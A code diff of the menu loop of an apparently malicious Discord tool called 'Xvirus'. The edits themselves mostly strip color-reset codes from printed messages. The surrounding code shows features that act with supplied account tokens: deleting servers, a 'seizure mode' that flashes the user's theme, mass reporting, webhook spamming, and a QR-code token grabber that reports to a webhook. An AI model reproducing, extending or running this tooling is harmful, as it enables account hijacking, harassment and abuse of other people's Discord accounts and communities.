@@ -79,7 +79,7 @@ def main():
             f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         if token.startswith("mfa."):
-            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Just a headsup Xvirus wont be able to delete the servers since the account has 2fa enabled')
+            print(f'[{Fore.RED}Error] : Just a headsup Xvirus wont be able to delete the servers since the account has 2fa enabled')
             sleep(3)
         processes = []
         #get all servers
@@ -104,7 +104,7 @@ def main():
         if yesno.lower() == "yes":
             image = input(f'Example: (C:\\Users\\myName\\Desktop\\Xvirus\\ShitOn.png):\n{Fore.RED}[{Fore.RED}>>>{Fore.RED}] Please input the icon location: {Fore.RED}')
             if not os.path.exists(image):
-                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Couldn\'t find "{image}" on your pc')
+                print(f'[{Fore.RED}Error] : Couldn\'t find "{image}" on your pc')
                 sleep(3)
                 main()
             with open(image, "rb") as f: _image = f.read()
@@ -113,13 +113,13 @@ def main():
         else:
             icon = None
         print(f'''
-    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Random server names
-    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Custom server names  
+    [{Fore.RED}1] Random server names
+    [{Fore.RED}2] Custom server names  
                         ''')
         secondchoice = input(
             f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] Second Choice: {Fore.RED}')
         if secondchoice not in ["1", "2"]:
-            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice')
+            print(f'[{Fore.RED}Error] : Invalid Second Choice')
             sleep(1)
             main()
         if secondchoice == "1":
@@ -192,7 +192,7 @@ def main():
         token = input(
             f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
-        print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
+        print(f'{Fore.MAGENTA}Starting seizure mode {Fore.WHITE}(Switching on/off Light/dark mode)\n')
         processes = [] 
         for i in range(threads):
             t = multiprocessing.Process(target=util.seizure.StartSeizure, args=(token, ))
@@ -207,6 +207,7 @@ def main():
 
 
     elif choice == '8':
+        print_slow(f"{Fore.BLUE}If the discriminator says #0 that means the the user has the new username system,\nand you would need to add them by using only the username\n")
         token = input(
         f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
@@ -242,14 +243,14 @@ def main():
             f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
         print(f'''
-    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Status changer
-    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Bio changer
-    {Fore.RESET}[{Fore.RED}3{Fore.RESET}] HypeSquad changer    
+    [{Fore.RED}1] Status changer
+    [{Fore.RED}2] Bio changer
+    [{Fore.RED}3] HypeSquad changer    
                         ''')
         secondchoice = input(
             f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Setting: {Fore.RED}')
         if secondchoice not in ["1", "2", "3"]:
-            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
+            print(f'[{Fore.RED}Error] : Invalid choice')
             sleep(1)
             main()
         if secondchoice == "1":
@@ -264,14 +265,14 @@ def main():
 
         if secondchoice == "3":
             print(f'''
-        {Fore.RESET}[{Fore.MAGENTA}1{Fore.RESET}]{Fore.MAGENTA} HypeSquad Bravery
-        {Fore.RESET}[{Fore.RED}2{Fore.RESET}]{Fore.LIGHTRED_EX} HypeSquad Brilliance
-        {Fore.RESET}[{Fore.LIGHTGREEN_EX}3{Fore.RESET}]{Fore.LIGHTGREEN_EX} HypeSquad Balance
+        [{Fore.MAGENTA}1]{Fore.MAGENTA} HypeSquad Bravery
+        [{Fore.RED}2]{Fore.LIGHTRED_EX} HypeSquad Brilliance
+        [{Fore.LIGHTGREEN_EX}3]{Fore.LIGHTGREEN_EX} HypeSquad Balance
                         ''')
             thirdchoice = input(
                 f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Hypesquad: {Fore.RED}')
             if thirdchoice not in ["1", "2", "3"]:
-                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
+                print(f'[{Fore.RED}Error] : Invalid choice')
                 sleep(1)
                 main()
             if thirdchoice == "1":
@@ -295,7 +296,7 @@ def main():
         util.qrgrabb.QR_Grabber(WebHook)
 
     elif choice == '15':
-        print(f"\n{Fore.RED}(the token you input is the account that will send the reports){Fore.RESET}")
+        print(f"\n{Fore.RED}(the token you input is the account that will send the reports)")
         token = input(
             f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
         validateToken(token)
@@ -338,13 +339,13 @@ def main():
 
     elif choice == '17':
         print(f'''
-    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Webhook Deleter
-    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
+    [{Fore.RED}1] Webhook Deleter
+    [{Fore.RED}2] Webhook Spammer    
                         ''')
         secondchoice = int(input(
             f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Second Choice: {Fore.RED}'))
         if secondchoice not in [1, 2]:
-            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice')
+            print(f'[{Fore.RED}Error] : Invalid Second Choice')
             sleep(1)
             main()
         if secondchoice == 1:
@@ -353,7 +354,7 @@ def main():
             validateWebhook(WebHook)
             try:
                 requests.delete(WebHook)
-                print(f'\n{Fore.GREEN}Webhook Successfully Deleted!{Fore.RESET}\n')
+                print(f'\n{Fore.GREEN}Webhook Successfully Deleted!\n')
             except Exception as e:
                 print(f'{Fore.RED}Error: {Fore.WHITE}{e} {Fore.RED}happened while trying to delete the Webhook')
 
@@ -392,12 +393,12 @@ def main():
         generate_and_save_valid_webhook()
 
     elif choice == '26':
-        print_slow(f"\n{Fore.RED}(This option is still WIP it will be included in one of the next updates.){Fore.RESET}")
+        print_slow(f"\n{Fore.RED}(This option is still WIP it will be included in one of the next updates.)")
         sleep(1)
         main()
 
     elif choice == '27':
-        print_slow(f"\n{Fore.RED}(This option is still WIP it will be included in one of the next updates.){Fore.RESET}")
+        print_slow(f"\n{Fore.RED}(This option is still WIP it will be included in one of the next updates.)")
         sleep(1)
         main()
 
@@ -418,7 +419,7 @@ def main():
         if keyboard.is_pressed(cancel_key):
             print(f"Press {cancel_key} to stop")
         ping("google.com")
-        input("Press ENTER to continue")
+        input("Press Enter To Exit!")
         main()
     
     elif choice == 'UPD':
@@ -436,7 +437,7 @@ def main():
         secondchoice = input(
             f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Setting: {Fore.RED}')
         if secondchoice not in ["1", "2", "3", "4", "5"]:
-            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Setting')
+            print(f'[{Fore.RED}Error] : Invalid Setting')
             sleep(1)
             main()
         if secondchoice == "1":
@@ -459,7 +460,7 @@ def main():
             elif themechoice == "5":
                 setTheme('neon')
             else:
-                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Theme')
+                print(f'[{Fore.RED}Error] : Invalid Theme')
                 sleep(1.5)
                 main()
             print_slow(f"{Fore.RED}Theme set to {Fore.BLUE}{getTheme()}")
@@ -481,7 +482,7 @@ def main():
                 amount = int(
                     input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Amount of threads: {Fore.RED}'))
             except ValueError:
-                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid amount')
+                print(f'[{Fore.RED}Error] : Invalid amount')
                 sleep(1.5)
                 main()
             if amount >= 45:
@@ -507,7 +508,7 @@ def main():
         {Fore.GREEN}Example: shift+Q
 
         {Fore.RED}You can have other modifiers instead of ctrl ⇣
-        {Fore.YELLOW}All keyboard modifiers:{Fore.RESET}
+        {Fore.YELLOW}All keyboard modifiers:
         ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl, alt gr, left alt, right alt
         """)
             sleep(1.5)
